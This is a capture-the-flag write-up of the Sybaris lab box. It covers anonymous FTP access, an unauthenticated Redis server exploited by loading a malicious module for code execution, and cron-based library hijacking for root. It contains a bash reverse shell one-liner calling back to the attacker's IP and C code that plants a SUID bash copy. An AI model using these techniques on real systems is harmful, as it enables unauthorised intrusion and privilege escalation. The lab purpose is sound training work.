---
layout: writeup
title: Sybaris - Proving Grounds
date: 2024-07-13 13:32:20 +0300
description: A Writeup of the Sybaris Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, LainKusunagi, Redis]
---

Here's a writeup for Sybaris, an Intermediate Proving Grounds box from the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). While this box has been rated Intermediate by OffSec, I'll note that the community has rated it to be Hard. I get started with an nmap scan to reveal:

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
6379/tcp open  redis
```

I check out port 80 by entering it into the web browser and begin a directory scan in the background: 

![Sybaris1.png](/assets/images/Sybaris/Sybaris1.png){: .responsive-image}

Seems like a basic blog run over the `HTMLy` platform. It doesn't really look like there's anything here, and the directory scan reveals a `/login` page but not much else. Entering any credentials to the admin page seems to take us to `http://$IP/login/login`. I also find nothing for HTMLy exploits. 

I move on temporarily from the web server and check out port 21. It looks like we are able to login with `anonymous:anonymous` credentials, and we see a directory called `pub`, but it's empty, and we can't upload anything to it. It actually hangs trying to `cd` into it, but when we `ls pub` we get nothing. 

That leaves port 6379, a redis server. Fortunately we got a little experience with redis through the [Readys](https://cagrigsby.github.io/writeups/2024-07-14-readys-proving-grounds/) box. We can access it without authentication using `redis-cli -H $IP`, but there's not much interesting when we check the info, and it looks like the db is empty when we use `pyredis-dump.py`. Hm. I do a little research to see what other information could be viewed, but I don't see anything that stands out even when I view the full configs (`CONFIG GET *`) or check for keys or hashes (`KEYS *`, `HKEYS *`). 

So it's time to start looking for exploits at this point. I give [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) a shot even though the redis version is 5.0.9 (rather than 5.0.5 and before) but no luck. I tried writing a [PHP webshell](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell) and , [creating an SSH key](https://github.com/iw00tr00t/Redis-Server-Exploit),  but I couldn't write against a read-only replica. I assumed this precluded some of the other suggestions, but I was mistaken. It turns out the actual answer is to [load a malicious redis module](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#load-redis-module)to perform RCE. Now hacktricks links to [this github page](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) so you can clone the repo and compile it using `sudo make`, but please note that **this will not work** on ARM devices such as MacOS. A discord user suggested using the pre-compiled module from  the redis-rogue-server exploit linked above. 

*I had to look into hints for this because apparently there was an issue with my connection.*

When I tried to upload a test file into the FTP server early on, I was unable to, and crucially, the FTP hung when I tried to `cd pub`. It actually hung another time as well. I assumed we could not access this directory, but after reading a writeup, I was incorrect, so I tried again. This time it worked. I'm ot sure why it worked sometimes and not others, maybe I was wearing it out with a directory scan or something, but regardless, we need to `put` the compiled module /`redis-rogue-server/exp.so` into pub, the full PATH of which is `/var/ftp/pub/exp.so`. From there we use `MODULE LOAD /var/ftp/pub/exp.so`, which allows us to use `system.exec` to execute commands as so:

![Sybaris2.png](/assets/images/Sybaris/Sybaris2.png){: .responsive-image}

After that I tried uploading a reverse shell which I got to download from my server but didn't execute, so I just ran a simple `system.exec "/bin/bash -i >& /dev/tcp/192.168.45.183/6379 0>&1"` from the redis-cli, and I was able to catch the shell with a penelope listener as pablo. 

![Sybaris3.png](/assets/images/Sybaris/Sybaris3.png){: .responsive-image}

I start enumerating from there and check out lse.sh. First things first:

![Sybaris4.png](/assets/images/Sybaris/Sybaris4.png){: .responsive-image}

It's empty. Thanks for nothing lse.

![Sybaris5.png](/assets/images/Sybaris/Sybaris5.png){: .responsive-image}

Here we go. Cron-job and a writable path. If we try to run the binary, we see there is a missing object file. We can create it, and it will be run with the log-sweeper binary. 

![Sybaris6.png](/assets/images/Sybaris/Sybaris6.png){: .responsive-image}

We create a c file on our kali machine:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

And transfer it to our target machine in the `/usr/local/lib/dev` folder. Then we run gcc on it: `gcc -shared -fPIC -nostartfiles -o utils utils.so`. This file will move a copy of `bash` to `/tmp` and add the SUID bit. That means when it runs, there should be a copy of bash in /tmp, and we can run `/tmp/bash -p` and get root. And it does and we do. 

![Sybaris7.png](/assets/images/Sybaris/Sybaris7.png){: .responsive-image}
